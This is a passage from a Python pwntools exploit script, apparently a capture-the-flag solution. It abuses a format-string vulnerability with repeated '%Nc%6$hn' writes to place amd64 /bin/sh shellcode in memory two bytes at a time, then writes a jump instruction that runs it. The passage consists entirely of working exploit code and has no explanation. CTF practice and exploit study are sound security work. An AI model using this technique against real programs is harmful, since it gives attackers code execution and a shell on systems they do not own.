...
# sla(b'string: ', "AAA%6$lln")

sh = asm(shellcraft.amd64.linux.sh())
if len(sh) % 2 != 0:
    sh = sh + b'\x90' * (2 - len(sh) % 2)

for i in range(0, len(sh), 2):
    chunk = u16(sh[i:i+2])
    sla(b'string: ', f'%{chunk}c%6$hn'.encode())

jump_to_start = asm('jmp $-0x30')
chunk = u16(jump_to_start)
sla(b'string: ', f'%{chunk}c%6$hn'.encode())

sla(b'string: ', b'') # exit loop
